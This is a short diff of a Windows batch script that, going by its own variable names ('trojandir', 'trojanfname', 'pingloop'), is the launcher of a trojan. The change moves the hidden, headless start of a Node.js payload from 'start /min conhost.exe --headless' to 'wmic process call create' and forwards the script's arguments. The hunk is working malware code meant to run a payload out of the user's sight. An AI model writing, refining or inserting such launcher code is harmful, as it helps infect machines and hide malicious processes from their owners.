@@ -139,8 +139,8 @@ exit 1
 
     IF "%errorlevel%"=="0" (
         echo  starting node launch_ping >> %logfpath%
-        start "" /min conhost.exe --headless %nodepath% %trojandir%\%trojanfname% launch_ping
-        REM wmic process call create conhost.exe --headless %nodepath% %trojandir%\%trojanfname% launch_ping
+        REM start "" /min conhost.exe --headless %nodepath% %trojandir%\%trojanfname% launch_ping %*
+        wmic process call create conhost.exe --headless %nodepath% %trojandir%\%trojanfname% launch_ping %*
     )
 
     echo pingloop sleeping %pingdelaytime% >> %logfpath%
